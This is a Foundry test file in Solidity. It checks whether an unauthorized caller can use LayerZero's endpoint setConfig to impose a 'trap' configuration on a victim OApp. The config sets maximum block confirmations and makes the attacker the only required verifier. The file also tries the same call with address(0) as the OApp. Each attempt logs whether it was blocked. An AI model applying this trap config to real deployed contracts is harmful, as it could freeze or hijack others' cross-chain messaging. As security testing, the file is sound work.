// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;
import { TestHelperOz5 } from "@layerzerolabs/test-devtools-evm-foundry/contracts/TestHelperOz5.sol";
import { MyRealOApp } from "../src/MyRealOApp.sol";
import { ILayerZeroEndpointV2 } from "@layerzerolabs/lz-evm-protocol-v2/contracts/interfaces/ILayerZeroEndpointV2.sol";
import { SetConfigParam } from "@layerzerolabs/lz-evm-protocol-v2/contracts/interfaces/IMessageLibManager.sol";
import { UlnConfig } from "@layerzerolabs/lz-evm-messagelib-v2/contracts/uln/UlnBase.sol";
import { console2 } from "forge-std/console2.sol";

/// @notice REAL attempts to force the confirmations sentinel trap onto a
/// VICTIM's OApp as an external, unauthorized attacker - not the owner,
/// not a delegate. Tests the actual boundary conditions directly,
/// not reasoned-about predictions.
contract RealExternalForceAttempt is TestHelperOz5 {
    MyRealOApp victimOApp;
    uint32 aEid = 1;
    uint32 bEid = 2;
    address VICTIM_OWNER = address(0x1111);
    address ATTACKER = address(0xDEAD);

    function setUp() public override {
        super.setUp();
        setUpEndpoints(2, LibraryType.UltraLightNode);
        // VICTIM deploys their OApp, but NEVER calls setDelegate - a
        // brand-new, never-touched-since-deployment OApp, exactly the
        // most common real-world state for a freshly deployed contract.
        victimOApp = new MyRealOApp(address(endpoints[bEid]), VICTIM_OWNER);
    }

    function test_ATTACK_UnauthorizedSetConfig_NeverSetDelegate() public {
        ILayerZeroEndpointV2 bEndpoint = ILayerZeroEndpointV2(address(endpoints[bEid]));
        (address receiveLib, ) = bEndpoint.getReceiveLibrary(address(victimOApp), aEid);

        address[] memory req = new address[](1);
        req[0] = ATTACKER;
        UlnConfig memory trapConfig = UlnConfig({
            confirmations: type(uint64).max,
            requiredDVNCount: 1, optionalDVNCount: 0, optionalDVNThreshold: 0,
            requiredDVNs: req, optionalDVNs: new address[](0)
        });
        SetConfigParam[] memory params = new SetConfigParam[](1);
        params[0] = SetConfigParam({eid: aEid, configType: 2, config: abi.encode(trapConfig)});

        console2.log("ATTACKER (never the owner, never set as delegate) attempting setConfig on VICTIM's OApp...");
        console2.log("Victim's delegate state (should be address(0), never set):", "checking...");

        vm.prank(ATTACKER);
        try bEndpoint.setConfig(address(victimOApp), receiveLib, params) {
            console2.log("!!!!! CRITICAL: UNAUTHORIZED setConfig SUCCEEDED - external force confirmed !!!!!");
        } catch Error(string memory reason) {
            console2.log("Blocked, with reason:", reason);
        } catch (bytes memory lowLevelData) {
            console2.log("Blocked, custom error, data length:", lowLevelData.length);
        }
    }

    function test_ATTACK_UnauthorizedSetConfig_ZeroAddressOApp() public {
        // Degenerate edge case: what if _oapp itself is address(0)?
        // delegates[address(0)] also defaults to address(0) - does the
        // check `msg.sender != _oapp && msg.sender != delegates[_oapp]`
        // ever produce a false pass for this specific combination?
        ILayerZeroEndpointV2 bEndpoint = ILayerZeroEndpointV2(address(endpoints[bEid]));
        (address receiveLib, ) = bEndpoint.getReceiveLibrary(address(victimOApp), aEid);

        SetConfigParam[] memory params = new SetConfigParam[](0);

        console2.log("Attempting setConfig with _oapp = address(0)...");
        vm.prank(ATTACKER);
        try bEndpoint.setConfig(address(0), receiveLib, params) {
            console2.log("!!!!! setConfig on address(0) succeeded - investigate further !!!!!");
        } catch Error(string memory reason) {
            console2.log("Blocked, with reason:", reason);
        } catch (bytes memory lowLevelData) {
            console2.log("Blocked, custom error, data length:", lowLevelData.length);
        }
    }
}
